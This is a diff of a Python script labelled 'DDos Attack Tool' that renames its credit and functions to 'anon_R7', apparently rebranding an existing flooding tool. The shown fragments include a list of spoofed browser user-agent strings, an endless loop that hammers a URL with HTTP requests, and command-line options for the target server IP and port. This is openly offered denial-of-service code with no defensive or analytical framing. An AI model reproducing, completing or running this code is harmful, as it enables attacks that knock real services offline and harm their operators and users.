@@ -1,14 +1,14 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-#  DDos Attack Tool v1.0
+#  DDos Attack Tool by : Anon_R7 v1.0
 
 
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
 
-def user_agent():
+def anon_R7():
 	global uagent
 	uagent=[]
 	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
@@ -29,7 +29,7 @@ def my_bots():
 	return(bots)
 
 
-def bot_hammering(url):
+def bot_anon_R7(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
@@ -89,7 +89,7 @@ def get_parameters():
 	global port
 	global thr
 	global item
-	optp = OptionParser(add_help_option=False,epilog="Hammers")
+	optp = OptionParser(add_help_option=False,epilog="anon_R7")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
